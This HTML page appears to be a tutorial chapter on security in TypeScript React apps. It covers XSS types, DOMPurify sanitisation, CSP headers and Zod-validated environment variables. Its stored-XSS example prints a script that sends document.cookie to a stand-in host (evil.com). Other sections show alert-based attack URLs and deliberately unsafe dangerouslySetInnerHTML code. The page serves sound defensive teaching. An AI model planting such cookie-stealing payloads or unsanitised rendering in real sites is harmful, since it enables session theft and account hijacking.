<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chapter 19: Security Considerations</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: #333;
            background: linear-gradient(135deg, #ff6b6b 0%, #4ecdc4 100%);
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        .header {
            background: linear-gradient(135deg, #ff6b6b 0%, #4ecdc4 100%);
            color: white;
            padding: 40px;
            text-align: center;
        }
        .header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        .content {
            padding: 40px;
        }
        .section {
            margin-bottom: 50px;
        }
        .section h2 {
            color: #ff6b6b;
            font-size: 2em;
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 3px solid #ff6b6b;
        }
        .section h3 {
            color: #4ecdc4;
            font-size: 1.5em;
            margin-top: 30px;
            margin-bottom: 15px;
        }
        .subsection {
            margin-bottom: 30px;
        }
        p {
            margin-bottom: 15px;
            text-align: justify;
        }
        .code-block {
            background: #f8f9fa;
            border-left: 4px solid #ff6b6b;
            padding: 20px;
            margin: 20px 0;
            border-radius: 5px;
            overflow-x: auto;
            font-family: 'Courier New', monospace;
            font-size: 0.9em;
            line-height: 1.5;
        }
        .highlight {
            background: #fff3cd;
            padding: 2px 6px;
            border-radius: 3px;
            font-weight: bold;
        }
        .tip-box {
            background: #d4edda;
            border-left: 4px solid #28a745;
            padding: 15px;
            margin: 20px 0;
            border-radius: 5px;
        }
        .tip-box strong {
            color: #28a745;
        }
        .warning-box {
            background: #fff3cd;
            border-left: 4px solid #ffc107;
            padding: 15px;
            margin: 20px 0;
            border-radius: 5px;
        }
        .warning-box strong {
            color: #856404;
        }
        .danger-box {
            background: #f8d7da;
            border-left: 4px solid #dc3545;
            padding: 15px;
            margin: 20px 0;
            border-radius: 5px;
        }
        .danger-box strong {
            color: #721c24;
        }
        .info-box {
            background: #d1ecf1;
            border-left: 4px solid #17a2b8;
            padding: 15px;
            margin: 20px 0;
            border-radius: 5px;
        }
        .info-box strong {
            color: #0c5460;
        }
        ul, ol {
            margin-left: 30px;
            margin-bottom: 15px;
        }
        li {
            margin-bottom: 8px;
        }
        .security-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin: 20px 0;
        }
        .security-card {
            background: #f8f9fa;
            border: 2px solid #ff6b6b;
            border-radius: 10px;
            padding: 20px;
        }
        .security-card h4 {
            color: #ff6b6b;
            margin-bottom: 10px;
        }
        .attack-example {
            background: #ffe6e6;
            border: 2px solid #ff6b6b;
            border-radius: 8px;
            padding: 15px;
            margin: 15px 0;
        }
        .defense-example {
            background: #e6f7e6;
            border: 2px solid #28a745;
            border-radius: 8px;
            padding: 15px;
            margin: 15px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>üõ°Ô∏è Chapter 19: Security Considerations</h1>
            <p>Building Secure TypeScript React Applications</p>
        </div>
        
        <div class="content">
            <!-- XSS Prevention -->
            <div class="section">
                <h2>19.1 XSS (Cross-Site Scripting) Prevention</h2>
                
                <div class="subsection">
                    <h3>‚ö†Ô∏è What is XSS?</h3>
                    <p><span class="highlight">Cross-Site Scripting (XSS)</span> is a security vulnerability where attackers inject malicious scripts into web pages viewed by other users. XSS is one of the most common and dangerous web vulnerabilities.</p>
                    
                    <div class="danger-box">
                        <strong>üö® Impact of XSS:</strong>
                        <ul>
                            <li>Steal user cookies and session tokens</li>
                            <li>Hijack user accounts</li>
                            <li>Deface websites</li>
                            <li>Redirect users to malicious sites</li>
                            <li>Log keystrokes and steal sensitive data</li>
                        </ul>
                    </div>

                    <h3>üî¥ Types of XSS Attacks</h3>
                    
                    <div class="security-grid">
                        <div class="security-card">
                            <h4>1. Stored XSS</h4>
                            <p>Malicious script is stored on the server (database, comments, etc.) and served to users</p>
                            <div class="attack-example">
<pre>// User submits comment:
&lt;script&gt;
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: document.cookie
  });
&lt;/script&gt;

// This gets saved and executed for all users
</pre>
                            </div>
                        </div>
                        
                        <div class="security-card">
                            <h4>2. Reflected XSS</h4>
                            <p>Script is reflected off a web server in URL parameters or form inputs</p>
                            <div class="attack-example">
<pre>// Malicious URL:
https://site.com/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;

// Server reflects input:
&lt;div&gt;Results for: {query}&lt;/div&gt;
</pre>
                            </div>
                        </div>
                        
                        <div class="security-card">
                            <h4>3. DOM-based XSS</h4>
                            <p>Vulnerability exists in client-side code that processes untrusted data</p>
                            <div class="attack-example">
<pre>// Vulnerable code:
const name = window.location.hash.slice(1);
document.getElementById('welcome').innerHTML = 
  `Welcome ${name}`;

// Attack URL:
https://site.com#&lt;img src=x onerror=alert('XSS')&gt;
</pre>
                            </div>
                        </div>
                    </div>

                    <h3>üõ°Ô∏è React's Built-in XSS Protection</h3>
                    <p>React automatically escapes values embedded in JSX, preventing XSS attacks:</p>
                    
                    <div class="defense-example">
                        <div class="code-block">
<pre>// ‚úÖ SAFE: React escapes the content
const userInput = '&lt;script&gt;alert("XSS")&lt;/script&gt;';

function SafeComponent() {
  return (
    &lt;div&gt;
      {userInput}  {/* Rendered as text, not executed */}
    &lt;/div&gt;
  );
}

// Output: &lt;script&gt;alert("XSS")&lt;/script&gt; (as text)
</pre>
                        </div>
                    </div>

                    <h3>‚ö†Ô∏è dangerouslySetInnerHTML - The XSS Trap</h3>
                    <p>React provides <span class="highlight">dangerouslySetInnerHTML</span> for rendering raw HTML, but it's dangerous!</p>
                    
                    <div class="danger-box">
                        <strong>üö® Vulnerable Code:</strong>
                    </div>
                    
                    <div class="code-block">
<pre>// ‚ùå DANGEROUS: XSS vulnerability!
interface CommentProps {
  html: string;
}

function Comment({ html }: CommentProps) {
  return &lt;div dangerouslySetInnerHTML={{ __html: html }} /&gt;;
}

// If html contains: "&lt;script&gt;steal()&lt;/script&gt;", it will execute!
</pre>
                    </div>

                    <h3>‚úÖ Safe Alternative: DOMPurify</h3>
                    <p>Use <span class="highlight">DOMPurify</span> to sanitize HTML before rendering:</p>
                    
                    <div class="code-block">
<pre>npm install dompurify
npm install -D @types/dompurify
</pre>
                    </div>
                    
                    <div class="defense-example">
                        <div class="code-block">
<pre>import DOMPurify from 'dompurify';
import type { FC } from 'react';

interface SafeHTMLProps {
  html: string;
  allowedTags?: string[];
  allowedAttributes?: string[];
}

const SafeHTML: FC&lt;SafeHTMLProps&gt; = ({ 
  html, 
  allowedTags = ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
  allowedAttributes = ['href', 'target']
}) => {
  // Sanitize HTML
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: allowedTags,
    ALLOWED_ATTR: allowedAttributes,
  });

  return &lt;div dangerouslySetInnerHTML={{ __html: clean }} /&gt;;
};

// Usage
function CommentDisplay({ comment }: { comment: string }) {
  return &lt;SafeHTML html={comment} /&gt;;
}

// Test
const maliciousComment = `
  &lt;p&gt;Nice post!&lt;/p&gt;
  &lt;script&gt;alert('XSS')&lt;/script&gt;
  &lt;img src=x onerror=alert('XSS')&gt;
`;

// ‚úÖ Output: &lt;p&gt;Nice post!&lt;/p&gt; (scripts removed)
</pre>
                        </div>
                    </div>

                    <h3>üîí Strict DOMPurify Configuration</h3>
                    <div class="code-block">
<pre>import DOMPurify from 'dompurify';

// Create a strict configuration
const createSanitizer = () => {
  const config = {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li'],
    ALLOWED_ATTR: ['href', 'title', 'target'],
    ALLOW_DATA_ATTR: false,  // Block data-* attributes
    ALLOW_UNKNOWN_PROTOCOLS: false,  // Block unknown protocols
    SAFE_FOR_TEMPLATES: true,  // Escape template literals
  };

  return (dirty: string): string => DOMPurify.sanitize(dirty, config);
};

const sanitize = createSanitizer();

// Usage
function RichTextDisplay({ content }: { content: string }) {
  return (
    &lt;div 
      dangerouslySetInnerHTML={{ __html: sanitize(content) }}
    /&gt;
  );
}
</pre>
                    </div>

                    <h3>üéØ TypeScript Types for Safe HTML</h3>
                    <div class="code-block">
<pre>// Create a branded type for sanitized HTML
type SanitizedHTML = string & { __brand: 'SanitizedHTML' };

function sanitizeHTML(dirty: string): SanitizedHTML {
  return DOMPurify.sanitize(dirty) as SanitizedHTML;
}

// Only accept sanitized HTML
interface SafeContentProps {
  html: SanitizedHTML;
}

function SafeContent({ html }: SafeContentProps) {
  return &lt;div dangerouslySetInnerHTML={{ __html: html }} /&gt;;
}

// Usage
const userInput = '&lt;script&gt;alert("XSS")&lt;/script&gt;&lt;p&gt;Hello&lt;/p&gt;';
const safe = sanitizeHTML(userInput);

// ‚úÖ Type-safe!
&lt;SafeContent html={safe} /&gt;

// ‚ùå Type error: string not assignable to SanitizedHTML
// &lt;SafeContent html={userInput} /&gt;
</pre>
                    </div>

                    <h3>üìã Content Security Policy (CSP)</h3>
                    <p>CSP is an HTTP header that prevents XSS by restricting resource sources:</p>
                    
                    <div class="code-block">
<pre>// Add to your server or meta tag
&lt;meta 
  http-equiv="Content-Security-Policy" 
  content="
    default-src 'self';
    script-src 'self' 'unsafe-inline' https://trusted-cdn.com;
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https:;
    font-src 'self' https://fonts.gstatic.com;
    connect-src 'self' https://api.yoursite.com;
    frame-ancestors 'none';
    base-uri 'self';
    form-action 'self';
  "
/&gt;

// Or in Express.js:
import helmet from 'helmet';

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'", "https://trusted-cdn.com"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'", "https://api.yoursite.com"],
      fontSrc: ["'self'", "https://fonts.gstatic.com"],
      objectSrc: ["'none'"],
      mediaSrc: ["'self'"],
      frameSrc: ["'none'"],
    },
  })
);
</pre>
                    </div>

                    <h3>üé® Safe Markdown Rendering</h3>
                    <div class="code-block">
<pre>import ReactMarkdown from 'react-markdown';
import type { FC } from 'react';

interface SafeMarkdownProps {
  content: string;
}

const SafeMarkdown: FC&lt;SafeMarkdownProps&gt; = ({ content }) => {
  return (
    &lt;ReactMarkdown
      // Only allow safe elements
      allowedElements={[
        'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
        'p', 'br', 'strong', 'em', 'ul', 'ol', 'li',
        'a', 'code', 'pre', 'blockquote'
      ]}
      // Sanitize links
      transformLinkUri={(uri) => {
        // Only allow http(s) and mailto
        if (uri.startsWith('http://') || 
            uri.startsWith('https://') || 
            uri.startsWith('mailto:')) {
          return uri;
        }
        return '';
      }}
    &gt;
      {content}
    &lt;/ReactMarkdown&gt;
  );
};
</pre>
                    </div>

                    <div class="tip-box">
                        <strong>üí° XSS Prevention Checklist:</strong>
                        <ul>
                            <li>‚úÖ Never use dangerouslySetInnerHTML without sanitization</li>
                            <li>‚úÖ Always sanitize user input with DOMPurify</li>
                            <li>‚úÖ Use Content Security Policy headers</li>
                            <li>‚úÖ Validate and escape URL parameters</li>
                            <li>‚úÖ Use HTTP-only cookies for sensitive data</li>
                            <li>‚úÖ Implement output encoding</li>
                        </ul>
                    </div>
                </div>
            </div>

            <!-- Type-Safe Environment Variables -->
            <div class="section">
                <h2>19.2 Type-Safe Environment Variables</h2>
                
                <div class="subsection">
                    <h3>üîê Why Type-Safe Env Vars?</h3>
                    <p>Environment variables are crucial for configuration but are stringly-typed and can cause runtime errors if missing or invalid. TypeScript can't check them by default.</p>
                    
                    <div class="danger-box">
                        <strong>üö® Common Problems:</strong>
                        <ul>
                            <li>Missing required environment variables discovered at runtime</li>
                            <li>Invalid format (expecting URL, got plain string)</li>
                            <li>Typos in variable names</li>
                            <li>No autocomplete or type checking</li>
                        </ul>
                    </div>

                    <h3>‚ùå Unsafe Approach</h3>
                    <div class="code-block">
<pre>// ‚ùå No type safety, no validation
const apiUrl = process.env.VITE_API_URL;  // string | undefined
const apiKey = process.env.VITE_API_KEY;

// Runtime error if missing!
fetch(apiUrl + '/users', {
  headers: { Authorization: apiKey }
});
</pre>
                    </div>

                    <h3>‚úÖ Solution: Zod Validation</h3>
                    <div class="code-block">
<pre>npm install zod
</pre>
                    </div>
                    
                    <div class="defense-example">
                        <div class="code-block">
<pre>// src/env.ts
import { z } from 'zod';

// Define schema
const envSchema = z.object({
  // API Configuration
  VITE_API_URL: z.string().url().min(1),
  VITE_API_KEY: z.string().min(1),
  
  // Environment
  VITE_ENV: z.enum(['development', 'staging', 'production']),
  
  // Feature Flags
  VITE_ENABLE_ANALYTICS: z
    .string()
    .transform(val => val === 'true')
    .pipe(z.boolean()),
  
  // Optional values with defaults
  VITE_MAX_RETRIES: z
    .string()
    .transform(Number)
    .pipe(z.number().int().positive())
    .default('3'),
    
  // Optional
  VITE_SENTRY_DSN: z.string().url().optional(),
});

// Parse and validate
const parseEnv = () => {
  try {
    return envSchema.parse(import.meta.env);
  } catch (error) {
    console.error('‚ùå Invalid environment variables:');
    console.error(error);
    throw new Error('Failed to load environment variables');
  }
};

// Export typed environment
export const env = parseEnv();

// Type inference
export type Env = z.infer&lt;typeof envSchema&gt;;
</pre>
                        </div>
                    </div>

                    <h3>üéØ Usage with Full Type Safety</h3>
                    <div class="code-block">
<pre>import { env } from './env';

// ‚úÖ Fully typed and validated!
const apiUrl = env.VITE_API_URL;  // string (validated URL)
const apiKey = env.VITE_API_KEY;  // string
const isProduction = env.VITE_ENV === 'production';  // boolean
const maxRetries = env.VITE_MAX_RETRIES;  // number

// Autocomplete works!
console.log(env.VITE_);  // Shows all available vars

// TypeScript catches typos
// console.log(env.VITE_API_KEX);  // ‚ùå Error: Property doesn't exist
</pre>
                    </div>

                    <h3>üöÄ Advanced: Different Schemas per Environment</h3>
                    <div class="code-block">
<pre>import { z } from 'zod';

// Base schema
const baseSchema = z.object({
  VITE_API_URL: z.string().url(),
  VITE_ENV: z.enum(['development', 'staging', 'production']),
});

// Development-specific
const devSchema = baseSchema.extend({
  VITE_DEBUG: z.string().transform(val => val === 'true').default('true'),
  VITE_MOCK_API: z.string().transform(val => val === 'true').default('false'),
});

// Production-specific  
const prodSchema = baseSchema.extend({
  VITE_SENTRY_DSN: z.string().url(),  // Required in prod
  VITE_GA_TRACKING_ID: z.string().min(1),  // Required in prod
  VITE_DEBUG: z.literal('false'),  // Must be false in prod
});

// Select schema based on environment
const getSchema = () => {
  const nodeEnv = import.meta.env.MODE;
  
  if (nodeEnv === 'production') {
    return prodSchema;
  }
  return devSchema;
};

export const env = getSchema().parse(import.meta.env);
</pre>
                    </div>

                    <h3>üîí Secure API Client with Typed Env</h3>
                    <div class="code-block">
<pre>// src/api/client.ts
import { env } from '../env';

interface RequestConfig extends RequestInit {
  requiresAuth?: boolean;
}

class ApiClient {
  private baseURL: string;
  private apiKey: string;

  constructor() {
    this.baseURL = env.VITE_API_URL;
    this.apiKey = env.VITE_API_KEY;
  }

  private async request&lt;T&gt;(
    endpoint: string,
    config: RequestConfig = {}
  ): Promise&lt;T&gt; {
    const { requiresAuth = true, headers = {}, ...rest } = config;

    const url = `${this.baseURL}${endpoint}`;
    
    const defaultHeaders: HeadersInit = {
      'Content-Type': 'application/json',
    };

    if (requiresAuth) {
      defaultHeaders['Authorization'] = `Bearer ${this.apiKey}`;
    }

    const response = await fetch(url, {
      ...rest,
      headers: { ...defaultHeaders, ...headers },
    });

    if (!response.ok) {
      throw new Error(`API Error: ${response.statusText}`);
    }

    return response.json();
  }

  async get&lt;T&gt;(endpoint: string, config?: RequestConfig): Promise&lt;T&gt; {
    return this.request&lt;T&gt;(endpoint, { ...config, method: 'GET' });
  }

  async post&lt;T&gt;(
    endpoint: string,
    data: unknown,
    config?: RequestConfig
  ): Promise&lt;T&gt; {
    return this.request&lt;T&gt;(endpoint, {
      ...config,
      method: 'POST',
      body: JSON.stringify(data),
    });
  }
}

export const apiClient = new ApiClient();

// Usage
interface User {
  id: string;
  name: string;
  email: string;
}

const user = await apiClient.get&lt;User&gt;('/users/123');
</pre>
                    </div>

                    <h3>üìù .env.example File</h3>
                    <div class="code-block">
<pre># .env.example
# Copy this file to .env and fill in the values

# API Configuration (Required)
VITE_API_URL=https://api.example.com
VITE_API_KEY=your_api_key_here

# Environment (Required)
VITE_ENV=development

# Feature Flags
VITE_ENABLE_ANALYTICS=false

# Optional
VITE_MAX_RETRIES=3
VITE_SENTRY_DSN=

# Production Only
# VITE_GA_TRACKING_ID=
</pre>
                    </div>

                    <h3>üõ†Ô∏è TypeScript Declaration for import.meta.env</h3>
                    <div class="code-block">
<pre>// src/vite-env.d.ts
/// &lt;reference types="vite/client" /&gt;

interface ImportMetaEnv {
  readonly VITE_API_URL: string;
  readonly VITE_API_KEY: string;
  readonly VITE_ENV: 'development' | 'staging' | 'production';
  readonly VITE_ENABLE_ANALYTICS: string;
  readonly VITE_MAX_RETRIES: string;
  readonly VITE_SENTRY_DSN?: string;
}

interface ImportMeta {
  readonly env: ImportMetaEnv;
}
</pre>
                    </div>

                    <div class="tip-box">
                        <strong>üí° Best Practices:</strong>
                        <ul>
                            <li>‚úÖ Validate env vars at app startup</li>
                            <li>‚úÖ Use Zod for runtime validation + type inference</li>
                            <li>‚úÖ Provide clear error messages for missing vars</li>
                            <li>‚úÖ Document all env vars in .env.example</li>
                            <li>‚úÖ Never commit .env to version control</li>
                            <li>‚úÖ Use different schemas for dev/prod</li>
                        </ul>
                    </div>

                    <h3>üîê Secrets Management</h3>
                    <div class="warning-box">
                        <strong>‚ö†Ô∏è Security Warning:</strong>
                        <p>In client-side apps (Vite, CRA), env vars prefixed with VITE_ or REACT_APP_ are exposed to the client! Never put secrets there.</p>
                    </div>
                    
                    <div class="code-block">
<pre>// ‚ùå BAD: These are visible in client bundle!
VITE_API_SECRET=supersecret123
VITE_DATABASE_PASSWORD=password123

// ‚úÖ GOOD: Use server-side env vars for secrets
// Backend .env (not exposed to client)
DATABASE_URL=postgresql://...
JWT_SECRET=...
API_SECRET=...

// Frontend .env (safe to expose)
VITE_API_URL=https://api.example.com
VITE_ENABLE_ANALYTICS=true
</pre>
                    </div>
                </div>
            </div>

            <div class="info-box">
                <strong>üéì Chapter Summary:</strong>
                <p>Security is paramount in web development! Always sanitize user input, validate environment variables at startup, implement CSP headers, and never trust client-side data. TypeScript helps catch many security issues at compile time, but you must still implement runtime validation and sanitization. Remember: security is not optional‚Äîit's essential.</p>
            </div>
        </div>
    </div>
</body>
</html>